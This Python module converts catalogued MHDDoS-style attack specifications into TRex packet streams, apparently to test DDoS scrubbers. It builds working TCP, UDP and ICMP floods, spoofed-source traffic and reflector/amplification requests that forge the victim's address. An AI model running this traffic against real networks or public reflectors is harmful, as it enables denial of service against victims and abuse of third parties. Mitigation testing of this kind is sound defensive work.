"""AttackSpec + LinkSpec + RunSpec -> TRex stateless streams.

Two source models, because they are two different attacks:

``pool``
    Each stream owns one baked source address and source port, and ``TCP.seq`` advances by
    the payload length. A scrubber reassembles a coherent request stream from one client -
    what N attacker threads actually look like.

``random`` / ``reflector``
    The field engine rewrites ``IP.src`` (``IP.dst`` for reflector) and ``sport`` per
    packet, i.e. a spoofed flood. Rewritten headers invalidate both checksums, so these
    streams carry a repair instruction: ``STLVmFixChecksumHw`` (NIC TX offload; TRex has no
    software L4 checksum instruction) or ``STLVmFixIpv4`` for ICMP, whose own checksum does
    not cover the IP header.
"""

import ipaddress

from scapy.layers.inet import ICMP, IP, TCP, UDP
from scapy.layers.l2 import Dot1Q, Ether
from scapy.packet import Raw
from trex.stl.api import (
    CTRexVmInsFixHwCs,
    STLPktBuilder,
    STLScVmRaw,
    STLStream,
    STLTXCont,
    STLVmFixChecksumHw,
    STLVmFixIpv4,
    STLVmFlowVar,
    STLVmWrFlowVar,
)

from .catalog import SPECS
from .spec import AttackSpec, BuildCtx, LinkSpec, Proto, RunSpec, SrcMode, Verdict

L4_TYPE = {Proto.UDP: CTRexVmInsFixHwCs.L4_TYPE_UDP, Proto.TCP: CTRexVmInsFixHwCs.L4_TYPE_TCP}
L4_NAME = {Proto.UDP: "UDP", Proto.TCP: "TCP"}
SEQ_START = 0x1000
SPORT_START = 1024
SPORT_SPAN = 60000
MAX_ETHERNET_FRAME = 1518


def _l2(link: LinkSpec) -> Ether:
    frame = Ether(src=link.src_mac, dst=link.dst_mac)
    return frame / Dot1Q(vlan=link.vlan) if link.vlan is not None else frame


def _l4(spec: AttackSpec, dport: int, sport: int):
    if spec.proto is Proto.TCP:
        return TCP(sport=sport, dport=dport, flags=spec.flags, seq=SEQ_START)
    if spec.proto is Proto.UDP:
        return UDP(sport=sport, dport=dport, chksum=0)
    return ICMP(type=8, id=SEQ_START & 0xFFFF)


def _fit(pkt, limit: int = MAX_ETHERNET_FRAME):
    """Trim the payload so the frame fits the link's MTU.

    MHDDoS hands a multi-kilobyte request to the kernel, which splits it into MSS-sized
    TCP segments. TRex sends one stream's payload in one frame and cannot segment, so an
    oversized payload would leave as a jumbo frame and be dropped by the first switch -
    the scrubber would see nothing and the run would prove nothing. The request keeps its
    start and its header terminator, so it stays a well-formed request; only its length
    differs. ``--size`` above the MTU is an explicit request for jumbo frames and raises
    the limit with it.
    """
    if len(pkt) <= limit or not pkt.haslayer(Raw):
        return pkt
    body = bytes(pkt[Raw].load)
    keep = len(body) - (len(pkt) - limit)
    terminator = b"\r\n\r\n" if body.endswith(b"\r\n\r\n") else b""
    head = body[: max(0, keep - len(terminator))]
    trimmed = pkt.copy()
    trimmed[Raw].load = head + terminator
    return trimmed


def _pad(pkt, size: int | None):
    if size is None or len(pkt) >= size:
        return pkt
    return pkt / Raw(b"\x00" * (size - len(pkt)))


def _spoof(name: str, field: str, low: int, high: int) -> list:
    return [
        STLVmFlowVar(name=name, min_value=low, max_value=high, size=4, op="random"),
        STLVmWrFlowVar(fv_name=name, pkt_offset=field),
    ]


def _cycle(name: str, field: str, addresses: tuple[str, ...]) -> list:
    """Rotate through an explicit address list.

    A random range over min..max would invent addresses that are not in the list, and
    MHDDoS only ever sends to reflectors it was given. ``value_list`` cycles them in order.
    """
    values = [int(ipaddress.ip_address(a)) for a in addresses]
    return [
        STLVmFlowVar(name=name, value_list=values, size=4, op="inc"),
        STLVmWrFlowVar(fv_name=name, pkt_offset=field),
    ]


def _sport(spec: AttackSpec) -> list:
    return [
        STLVmFlowVar(name="sport", min_value=SPORT_START, max_value=SPORT_START + SPORT_SPAN, size=2, op="random"),
        STLVmWrFlowVar(fv_name="sport", pkt_offset=f"{L4_NAME[spec.proto]}.sport"),
    ]


def _checksum(spec: AttackSpec) -> list:
    if spec.proto is Proto.ICMP:
        return [STLVmFixIpv4(offset="IP")]
    return [
        STLVmFixChecksumHw(
            l3_offset="IP", l4_offset=L4_NAME[spec.proto], l4_type=L4_TYPE[spec.proto]
        )
    ]


def _vm_pool(spec: AttackSpec, payload_len: int) -> STLScVmRaw | None:
    """TCP continuity: one flow per stream, sequence advancing with the payload.

    The range must cover the whole 32-bit space. A short range wraps in a few dozen
    packets and every wrap steps the sequence backwards, which a receiver reads as
    retransmission or out-of-window data - the flow stops being a coherent client.
    """
    if spec.proto is not Proto.TCP:
        return None
    return STLScVmRaw(
        [
            STLVmFlowVar(
                name="seq",
                min_value=SEQ_START,
                max_value=2**32 - 1,
                step=max(1, payload_len),
                size=4,
                op="inc",
            ),
            STLVmWrFlowVar(fv_name="seq", pkt_offset="TCP.seq"),
            STLVmFixChecksumHw(l3_offset="IP", l4_offset="TCP", l4_type=L4_TYPE[Proto.TCP]),
        ]
    )


def _vm_spoof(spec: AttackSpec, low: int, high: int) -> STLScVmRaw:
    instructions = [] if spec.proto is Proto.ICMP else _sport(spec)
    instructions += _spoof("src", "IP.src", low, high)
    instructions += _checksum(spec)
    return STLScVmRaw(instructions)


def _vm_reflector(spec: AttackSpec, reflectors: tuple[str, ...]) -> STLScVmRaw:
    """Destination rotates over the reflector list; the rest of the request is fixed.

    Source address and port are the victim's own - that is where the reflector's reply
    goes, and what MHDDoS puts in ``uh_sport``.
    """
    return STLScVmRaw(_cycle("dst", "IP.dst", reflectors) + _checksum(spec))


def _src_pool(prefix: str, flows: int) -> list[str]:
    """Synthetic clients drawn from the configured prefix.

    A /32 or /31 has no usable host range, so the address itself is used rather than
    stepping outside the prefix the operator asked for.
    """
    net = ipaddress.ip_network(prefix, strict=False)
    first = int(net.network_address) + 1
    last = int(net.broadcast_address) - 1
    if last <= first:
        return [str(net.network_address)] * flows
    span = last - first + 1
    return [str(ipaddress.ip_address(first + (i % span))) for i in range(flows)]


def _dport(name: str, run: RunSpec, source) -> int:
    """MHDDoS sends protocol queries to the target port and amplifier requests to the
    reflector's own port, so only the reflector table overrides ``--dport``."""
    if name in source.amplifiers:
        return source.amplifiers[name][1]
    return run.dport


def _l7_len(pkt) -> int:
    """Bytes this frame puts in the TCP stream, padding included.

    The sequence number must advance by exactly what the segment carries, so this is read
    off the finished packet rather than the payload the builder produced - trimming and
    padding both change the length.
    """
    return len(bytes(pkt[TCP].payload)) if pkt.haslayer(TCP) else 0


def build_streams(name: str, run: RunSpec, link: LinkSpec, ctx: BuildCtx, source) -> list[STLStream]:
    spec = SPECS[name]
    if spec.verdict not in (Verdict.WIRE, Verdict.SHAPE):
        raise ValueError(f"{name} is not emittable: {spec.verdict.value}")

    dport = _dport(name, run, source)
    per_stream = max(1, run.pps // max(1, run.flows))
    net = ipaddress.ip_network(run.src_prefix, strict=False)
    low = int(net.network_address) + 1
    high = max(low, int(net.broadcast_address) - 1)
    sources = _src_pool(run.src_prefix, run.flows)
    reflectors = run.reflectors or (run.victim,)

    streams = []
    for index in range(run.flows):
        payload = spec.build(ctx, index, source) if spec.build else b""

        if spec.src_mode is SrcMode.REFLECTOR:
            src, dst = run.victim, reflectors[index % len(reflectors)]
        elif spec.src_mode is SrcMode.RANDOM:
            src, dst = sources[0], run.victim
        else:
            src, dst = sources[index], run.victim

        sport = run.dport if spec.src_mode is SrcMode.REFLECTOR else SPORT_START + index
        pkt = _l2(link) / IP(src=src, dst=dst) / _l4(spec, dport, sport)
        if payload:
            pkt = pkt / Raw(payload)
        pkt = _pad(_fit(pkt, max(MAX_ETHERNET_FRAME, run.size or 0)), run.size)

        if spec.src_mode is SrcMode.REFLECTOR:
            vm = _vm_reflector(spec, reflectors)
        elif spec.src_mode is SrcMode.RANDOM:
            vm = _vm_spoof(spec, low, high)
        else:
            vm = _vm_pool(spec, _l7_len(pkt))

        streams.append(
            STLStream(
                name=f"{name}-{index}",
                packet=STLPktBuilder(pkt=pkt, vm=vm) if vm else STLPktBuilder(pkt=pkt),
                mode=STLTXCont(pps=per_stream),
            )
        )
    return streams
